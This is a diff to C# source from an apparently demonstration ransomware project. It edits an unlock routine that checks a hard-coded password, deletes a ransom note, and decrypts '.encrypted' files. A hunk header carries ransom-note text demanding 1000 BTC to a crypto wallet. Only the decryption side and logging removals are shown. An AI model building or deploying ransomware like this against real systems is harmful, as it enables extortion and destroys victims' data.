@@ -208,10 +208,10 @@ Geslo vam pošljemo ko na donirate 1000BTC na naš crypto wallet:1A1zP1eP5QGefi2
 
         public static void UnlockFolder(string password)
         {
+
             // Provera lozinke
             if (password != "demo123")
             {
-                Console.WriteLine("[ERROR] Pogrešna lozinka!");
                 MessageBox.Show("Pogrešna lozinka! Pokušajte ponovo.", "Greška", MessageBoxButton.OK, MessageBoxImage.Error);
                 return;
             }
@@ -220,19 +220,15 @@ Geslo vam pošljemo ko na donirate 1000BTC na naš crypto wallet:1A1zP1eP5QGefi2
 
             if (!Directory.Exists(folderPath))
             {
-                Console.WriteLine($"[ERROR] Folder ne postoji: {folderPath}");
                 MessageBox.Show($"Folder ne postoji: {folderPath}", "Greška", MessageBoxButton.OK, MessageBoxImage.Error);
                 return;
             }
-
-            Console.WriteLine("[INFO] Pokrećem DEKRIPCIJU fajlova...");
 
             // Obriši ransom note
             string ransomNote = Path.Combine(folderPath, "README_LOCKED.txt");
             if (File.Exists(ransomNote))
             {
                 File.Delete(ransomNote);
-                Console.WriteLine("  Obrisan: README_LOCKED.txt");
             }
 
             // Dešifruj sve .encrypted fajlove
@@ -241,21 +237,18 @@ Geslo vam pošljemo ko na donirate 1000BTC na naš crypto wallet:1A1zP1eP5QGefi2
             {
                 if (file.EndsWith(".encrypted"))
                 {
-                    string originalFile = file.Substring(0, file.Length - 10); // skini .encrypted
+                    string originalFile = file.Substring(0, file.Length - 10);
                     DecryptFile(file, originalFile);
-                    Console.WriteLine($"  Dešifrovan: {Path.GetFileName(file)} → {Path.GetFileName(originalFile)}");
                     anyDecrypted = true;
                 }
             }
 
             if (!anyDecrypted)
             {
-                Console.WriteLine("[INFO] Nema enkriptovanih fajlova.");
                 MessageBox.Show("Nema enkriptovanih fajlova!", "Info", MessageBoxButton.OK, MessageBoxImage.Information);
             }
             else
             {
-                Console.WriteLine("\n[SUCCESS] Svi fajlovi su dešifrovani!");
                 MessageBox.Show("Fajlovi su uspešno dešifrovani!", "Uspeh", MessageBoxButton.OK, MessageBoxImage.Information);
             }
         }
